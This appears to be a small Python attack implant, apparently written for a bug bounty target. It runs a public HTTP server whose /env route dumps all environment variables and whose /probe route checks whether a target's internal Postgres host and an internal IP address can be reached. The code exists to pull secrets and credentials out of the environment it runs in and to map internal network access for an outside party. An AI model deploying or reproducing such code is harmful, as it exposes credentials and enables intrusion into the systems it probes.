import os, socket, json
from http.server import BaseHTTPRequestHandler, HTTPServer

FALCON_HOSTS = [
    ("falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", 12691),
    ("10.1.47.111", 5432),
    ("falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", 5432),
]

def probe(host, port, timeout=5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return "OPEN"
    except Exception as e:
        return f"CLOSED({type(e).__name__}: {e})"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/env":
            out = "=== ENV ===\n"
            for k, v in sorted(os.environ.items()):
                out += f"{k}={v}\n"
            self.send_response(200); self.end_headers()
            self.wfile.write(out.encode()); return
        if self.path == "/probe":
            out = "=== TCP PROBE ===\n"
            for h, p in FALCON_HOSTS:
                out += f"{h}:{p} -> {probe(h,p)}\n"
            self.send_response(200); self.end_headers()
            self.wfile.write(out.encode()); return
        self.send_response(200); self.end_headers()
        self.wfile.write(b"OK. /env /probe\n")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever()
